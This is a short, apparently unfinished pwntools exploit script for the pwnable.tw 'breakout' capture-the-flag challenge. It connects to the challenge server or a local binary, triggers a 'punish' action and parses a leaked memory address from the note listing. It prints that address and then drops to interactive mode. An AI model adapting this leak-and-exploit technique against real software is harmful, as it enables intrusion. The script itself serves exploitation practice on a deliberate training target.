from pwn import *

e = ELF("./breakout")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10400)
else:
  p = process(e.path, env={"LD_LIBRARY_PATH": "/pwn/pwnabletw/break-out"})

def alloc(cell, size, msg):
  p.sendline("note")
  p.sendlineafter("Cell:", str(cell))
  p.sendlineafter("Size:", str(size))
  p.sendafter("Note:", msg)
  p.recvuntil(">")


p.sendline("punish")
p.sendlineafter("Cell:", "1")
p.recvuntil(">")

p.sendline("list")
p.recvuntil("Cell: 2")
p.recvuntil("Risk: ")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00"))
print("{:#x}".format(leak))

p.recvuntil(">")

p.interactive()
